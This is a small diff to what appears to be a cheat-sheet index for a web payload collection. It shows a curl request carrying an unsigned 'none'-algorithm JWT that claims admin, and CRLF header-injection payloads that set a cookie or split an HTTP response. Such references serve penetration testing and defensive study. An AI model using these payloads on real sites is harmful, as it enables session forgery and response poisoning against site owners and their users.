@@ -137,8 +137,8 @@ curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ." http
 ### CRLF / Header Injection — `CRLF Injection/README.md`
 
 ```http
-__omp_magic("", "0d%0aSet-Cookie: hacked=1")
-__omp_magic("", "0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK")
+%0d%0aSet-Cookie: hacked=1
+%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK
 ```
 
 ## Search recipes (bulk PAT)
